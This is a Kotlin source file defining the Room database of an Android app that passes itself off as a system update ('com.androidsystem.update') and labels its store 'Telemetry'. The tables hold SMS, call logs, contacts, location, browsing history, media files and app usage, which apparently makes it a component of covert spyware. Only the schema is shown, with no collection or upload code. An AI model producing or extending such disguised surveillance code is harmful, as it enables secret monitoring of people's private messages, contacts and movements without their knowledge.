package com.androidsystem.update.database

import androidx.room.Database
import androidx.room.RoomDatabase

@Database(
    entities = [
        CollectedDataEntity::class,
        LocationEntity::class,
        SmsEntity::class,
        CallEntity::class,
        ContactEntity::class,
        BrowsingHistoryEntity::class,
        MediaFileEntity::class,
        DeviceInfoEntity::class,
        AppUsageEntity::class
    ],
    version = 4,
    exportSchema = false
)
abstract class TelemetryDatabase : RoomDatabase() {
    abstract fun telemetryDao(): TelemetryDao
}
